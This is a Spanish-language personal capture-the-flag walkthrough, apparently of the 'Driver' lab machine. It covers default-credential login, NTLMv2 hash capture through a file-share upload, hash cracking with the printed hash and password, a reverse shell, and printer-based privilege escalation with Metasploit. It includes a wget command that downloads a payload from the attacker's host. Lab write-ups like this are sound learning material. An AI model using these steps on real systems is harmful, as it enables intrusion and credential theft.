Para acordarme de este manana voy a flipar.

Bueno empezamos

Escaneo de nmap con puertos abiertos
![[Pasted image 20250417103744.png]]

De primeras nos pide que nos loggemos probamos con credenciales por defecto admin:admin tenemos acceso
![[Pasted image 20250417103656.png]]

Entramos a esta pagina aqui no hay mucho solamente podemos subir un archivo.
![[Pasted image 20250417103818.png]]

Tenemos esto de aqui si no recuerdo mal se podia subir un archivo de forma manual y capturar el handsake con request y el hash para acceder por remote evilwinrm?
  Select printer model and upload the respective firmware update to our file share. Our testing team will review the uploads manually and initiates the testing soon.
  
  
  creamos el archivo ![[Pasted image 20250417104725.png]]
  nos ponemos a la escucha ![[Pasted image 20250417104739.png]]

estaba haciendo varias cosas mal la primera no escuchar en la interfaz que tenia que hacerlo y me habia dejado una \ en la ip y me daba error ![[Pasted image 20250417105707.png]]
tenemos ya los hashes ![[Pasted image 20250417105736.png]]
buscamos en hashcat para poder crackear el hash ntlvme ![[Pasted image 20250417105846.png]]

 y ya manos a la obra 
 
 ![[Pasted image 20250417110101.png]]
TONY::DRIVER:994c57e0f03b0cd9:d6b77f953cbf0b2d306232bbe829e142:010100000000000080cba88699aedb0152df2225ad364e02000000000200080048004c003900380001001e00570049004e002d0037005500300044004a0041005800460034004200530004003400570049004e002d0037005500300044004a004100580046003400420053002e0048004c00390038002e004c004f00430041004c000300140048004c00390038002e004c004f00430041004c000500140048004c00390038002e004c004f00430041004c000700080080cba88699aedb01060004000200000008003000300000000000000000000000002000007d25e4e270e65e00be7cbd4090b98d0f7a7f5c27068613a6e3a5b4451d7050650a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003000000000000000000000000000:liltony

![[Pasted image 20250417110131.png]]
ya lo tendriamos 

tenemos reverse shell ![[Pasted image 20250417110616.png]]
flag del user 
![[Pasted image 20250417111003.png]]

nos traemos winpeas
![[Pasted image 20250417111559.png]]
al ejecutarlo vemos el historial de comandos ![[Pasted image 20250417111824.png]]
vemos en el historial de comandos que se ha interactuado conn una  impresora ![[Pasted image 20250417111955.png]]

tenemos este exploit pero necesitamos tener primero una sesion dentro de metasploit asique a hacer priero el payload ![[Pasted image 20250417112334.png]]

ya tenemos el payload ![[Pasted image 20250417112753.png]]

ahora faltaria conseguir la session y luego ya exlotar la vulnerabilidad si no me equivoco 

nos ponemos a la escucha con python3 hacemos la peticion desde la maquina windows para traer el archivo
wget http://10.10.14.20:8000/payload.exe -o payload.exe

 nos ponemos a la escucha con metasploit ejecutamos y tenemos shell ![[Pasted image 20250417113056.png]]
 estaba pensando y habia que migrar primero el proceso para que me dejara hacer el exploit ya no me acordaba de esto que justo lo vi ayer tmb
 
 si no me equivoco ahora deberia de funcionar ![[Pasted image 20250417114423.png]]
 
 antes no me ha dejado pero porque no he migrado a un proceso correcto ahora ya lo tenemos ![[Pasted image 20250417114816.png]]